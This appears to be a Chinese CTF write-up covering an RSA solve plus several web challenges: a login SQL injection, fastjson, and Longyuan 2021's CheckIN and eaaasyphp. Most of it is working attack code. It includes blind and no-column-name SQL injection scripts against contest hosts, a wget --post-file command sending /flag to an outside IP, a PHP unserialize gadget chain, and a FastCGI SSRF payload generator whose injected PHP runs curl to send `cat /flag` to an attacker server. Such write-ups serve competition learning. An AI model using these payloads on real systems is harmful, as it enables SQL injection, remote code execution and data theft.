## cry

### **ezrsa**

`https://xz.aliyun.com/t/6459`





![image-20211107121208771](https://gitee.com/taochiyu/blogimage/raw/master/img/20211107121208.png)



```
import gmpy2
import libnum

# #sage
# p = 7775037945450972074306550333494120484720176686937970436452427912326505124727011077406894038014608345834514099931510587280606879496551971589714415968674853
# q = 7775037945450972074306550333494120484720176686937970436452427912326505124727011077406894038014608345834514099931510587280606879496551971589714415968674527
# a = 5860001067333912869348276317959806331354930830756907188134520598132033029685961651079042255479216212218840727162091566460728252274773922656346335208185716
# b = 233846791877558838234653540832234409293133184826445436186569970711741339843931083266127545694840179770763904903248540633847534630328748650704882388519907
# print(crt([a,b],[p,q]))

n = 60451215053202473004940952621742735161658776366659855277231745089406139921920247699935855664424690715827311751776376765039253720695107034417349327247413785321282310515940197744035889015386751355695663945883766755254889478550954910913617031495509031272479126330010210073745554866695555903062215643355046569531
p = 7775037945450972074306550333494120484720176686937970436452427912326505124727011077406894038014608345834514099931510587280606879496551971589714415968674853
q = 7775037945450972074306550333494120484720176686937970436452427912326505124727011077406894038014608345834514099931510587280606879496551971589714415968674527

c = 47151276918981583567523648994179430148149948747698685873110089240682910171948851068764675122915379237725883244046107442907684194750830923424437683099073544825359731502984910522664259100042832108387724184182561564126572144921453168070150979343615465806743760339599417267305068355617917378977403151005726078444
phi = (p - 1) * (q - 1)
e =  65537
d = gmpy2.invert(e,phi)
m = pow(c,d,p*q)
print(libnum.n2s(int(m)))
```





## web

### **login**

```
https://xz.aliyun.com/t/8646#toc-3
```

```
username=xxxxxxx' union values row(1,2,'e10adc3949ba59abbe56e057f20f883e')#&password=123456&login=login
```





```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/11/7 11:55
# @Author  : upload
# @File    : 222.py
# @Software: PyCharm
import requests

proxies = {
    "http":"127.0.0.1:8080"
}

url = "http://eci-2ze0rz74ppzjjkatemif.cloudeci1.ichunqiu.com:80/"
flag=''
for i in range(1,50):
    f1=flag
    top=127
    low=1
    while low<=top:
        mid=(top+low)//2
        # data={"username":"admina'||ascii(substr(version(),{},1))>{}#".format(str(i),str(mid)),"password":"admin"}
        # data1={"username":"admina'||ascii(substr(version(),{},1))={}#".format(str(i),str(mid)),"password":"admin"}
        data={"username":"admina'||ascii(substr(version(),{},1))>{}#".format(str(i),str(mid)),"password":"admin","login": "login"}
        data1 = {"username":"admina'||ascii(substr(version(),{},1))={}#".format(str(i),str(mid)),"password":"admin",
         "login": "login"}
        try:
            r1=requests.post(url,data=data1,proxies=proxies)
            print(i,mid)
            if '密码错误' in r1.text:
                flag+=chr(mid)
                print(flag)
                break
            r=requests.post(url,data=data)
            if "密码错误" in r.text:
                low=mid+1
            else:
                top=mid-1
        except Exception as e:
            pass
    if flag==f1:
        break

8.0.27-0ubuntu0.20.04.1
```

无列名注入！

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/11/7 11:55
# @Author  : upload
# @File    : 111.py
# @Software: PyCharm
import requests

url = 'http://182.116.62.85:26571/login.php'
flag=''
proxies={
    "http":"127.0.0.1:8080"
}
index=0
s='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}'
for i in range(1,50):
    f1=flag
    for j in s:
        # data = {"username": "aaaaa'||(case/**/when(('def','ctf',binary/**/'{}',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)<(table/**/`information_schema`.`PARTITIONS`/**/order/**/by/**/19/**/desc/**/limit/**/0,1))/**/then/**/1/**/else/**/0/**/end)#".format(flag+j), "password": "123"}
        data = {"username": "aaaaa'||(case/**/when((binary/**/'{}')<(table/**/fl11aag/**/limit/**/1,1))/**/then/**/1/**/else/**/0/**/end)#".format(flag+j), "password": "123"}
        try:
            print(i,j)
            r1=requests.post(url, data=data,proxies=proxies)
            if 'username error!' in r1.text:
                flag+=s[s.index(j)-1]
                print(flag)
                break
        except Exception as e:
            print(e)
    if flag==f1:
        break
print(flag)
# fl11aag
# flag{try_again}
# flag{spMG94bd95z7h07ZZhCFXQutxYmKwTtL}
```



### **海量视频**



`https://www.zybuluo.com/Chiang/note/1669054#%E5%B8%B8%E8%A7%84%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%A0%81`



`https://github.com/mm0r1/exploits/tree/master/php-filter-bypass`



### **easy_fastjson**

```
<version>1.2.42</version>
```

2021 VNCTF Web Writeup

下载 [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit) 工具，执行如下命令搭建ldap服务：

`https://www.freebuf.com/vuls/279465.html`





## 陇原战"疫"2021网络安全大赛



### CheckIN



```
 wget --post-file=sdd.c http://test1.wifi-times.com/uploadfile.php
 /wget?argv=&argv=--post-file=/flag&argv=121.4.124.62:99
```



### eaaasyphp

```php
<?php

class Check {
    public static $str1 = false;
    public static $str2 = false;
}


class Esle {
    public function __wakeup()
    {
        Check::$str1 = true;
    }
}


class Hint {

    public function __wakeup(){
        $this->hint = "no hint";
    }

    public function __destruct(){
        if(!$this->hint){
            $this->hint = "phpinfo";
            ($this->hint)();
        }  
    }
}


class Bunny {

    public function __toString()
    {
        if (Check::$str2) {
            if(!$this->data){
                $this->data = $_REQUEST['data'];
            }
            file_put_contents($this->filename, $this->data);
        } else {
            throw new Error("Error");
        }
    }
}

class Welcome {
    public function __invoke()
    {
        Check::$str2 = true;
        return "Welcome" . $this->username;
    }
}

class Bypass {

    public function __destruct()
    {
        if (Check::$str1) {
            ($this->str4)();
        } else {
            throw new Error("Error");
        }
    }
}

if (isset($_GET['code'])) {
    unserialize($_GET['code']);
} else {
    highlight_file(__FILE__);
}
```



```php
<?php

class Esle {

    public function __construct(){
        $this->a = new Bypass();
    }
}


class Bypass {

    public function __construct(){
        $this->str4 = new Welcome();
    }

}


class Bunny {

    public function __construct(){
        $a = "%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%B8%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%0B%0ASCRIPT_NAME%2Findex.php%0B%0AREQUEST_URI%2Findex.php%0FAPHP_ADMIN_VALUEallow_url_include%3DOn%0Aopen_basedir%3D%2F%0Aauto_prepend_file%3Dphp%3A%2F%2Finput%0F%11SERVER_SOFTWAREphp%2Ffastcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0C%21CONTENT_TYPEapplication%2Fx-www-form-urlencoded%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%22curl+47.94.0.250%3A1%2F%60cat+%2Fflag%60%22%29%3B%3F%3E%01%05%00%01%00%00%00%00";
        $this->data = urldecode($a);

        $this->filename = 'ftp://47.94.0.250:2335/anything';
    }
}

class Welcome {
    public function __construct(){
        $this->username = new Bunny();
    }
}

$a = new Esle();
//echo serialize($a);
echo urlencode(serialize($a));
```



```php
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
//        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        // 输出构造好的请求
        return (urlencode($request));
//        fwrite($this->_sock, $request);
//        do {
//            $resp = $this->readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
//                $response .= $resp['content'];
//            }
//        } while ($resp && $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) {
//            throw new Exception('Bad request');
//        }
//        switch (ord($resp['content']{4})) {
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE:
//                return $response;
//        }
    }
}
// php5
// ssrf生成payload的话，这里不用管
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$SCRIPT_FILENAME = '/var/www/html/index.php';
$SCRIPT_NAME = '/'.basename($SCRIPT_FILENAME);
// GET参数
$REQUEST_URI = $SCRIPT_NAME;
// POST参数
$content = '<?php system("curl 47.94.0.250:1/`cat /flag`");?>';
// 设置php_value利用php://input执行代码
$PHP_ADMIN_VALUE = "allow_url_include=On\nopen_basedir=/\nauto_prepend_file=php://input";
// 设置php_value加载恶意so文件
// $PHP_ADMIN_VALUE = "extension_dir = /tmp\nextension = evil.so\n";
//$PHP_ADMIN_VALUE = "extension_dir = /var/www/html\nextension = 1.so\n";
$res = $client->request(
    array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD' => 'POST',
        'SCRIPT_FILENAME' => $SCRIPT_FILENAME,
        'SCRIPT_NAME' => $SCRIPT_NAME,
        'REQUEST_URI' => $REQUEST_URI,
        'PHP_ADMIN_VALUE'   => $PHP_ADMIN_VALUE,
        'SERVER_SOFTWARE' => 'php/fastcgiclient',
        'REMOTE_ADDR' => '127.0.0.1',
        'REMOTE_PORT' => '9985',
        'SERVER_ADDR' => '127.0.0.1',
        'SERVER_PORT' => '80',
        'SERVER_NAME' => 'localhost',
        'SERVER_PROTOCOL' => 'HTTP/1.1',
        'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
        'CONTENT_LENGTH' => strlen($content),
    ),
    $content
);
# no 二次编码
#echo('gopher://127.0.0.1:9000/_'.$res);  # 二次编码的时候 +不能编码
# 根据情况选择是否需要二次编码
//echo('gopher://127.0.0.1:9000/_'.str_replace("%2B", "+", ($res)));
//echo('gopher://127.0.0.1:9000/_'.str_replace("%2B", "+", ($res)));
echo(str_replace("%2B", "+", ($res)));
// /run/php/php7.3-fpm.sock
// sudo gedit /etc/nginx/sites-enabled/default
```



```
file_put_contents("ftp://vps:端口/anything",前面文件生成的 fastcgi payload，因为有特殊字符制作时做了urlencode所以这里进行urldecode一次)
```





